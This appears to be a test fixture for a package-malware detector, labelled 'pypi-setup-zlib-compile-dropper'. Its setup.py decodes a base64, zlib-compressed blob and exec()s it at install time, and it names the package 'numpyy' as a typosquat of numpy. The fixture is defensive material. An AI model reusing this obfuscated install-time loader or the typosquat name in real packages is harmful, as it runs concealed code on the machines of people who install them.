name: pypi-setup-zlib-compile-dropper
note: setup.py compiles and exec()s a zlib-decompressed blob at install time — compile()+exec() over a decompressed payload, another obfuscated sdist-dropper shape. Package name typosquats `numpy`.

sourceFiles.setup.py:
from setuptools import setup
import zlib, base64

_blob = base64.b64decode("eJwLSS0uUShJLS5RSMwrKUosSVUoLknMK04FAKW8CJU=")
exec(compile(zlib.decompress(_blob), "<config>", "exec"))

setup(name="numpyy", version="1.26.0", py_modules=["numpyy"])
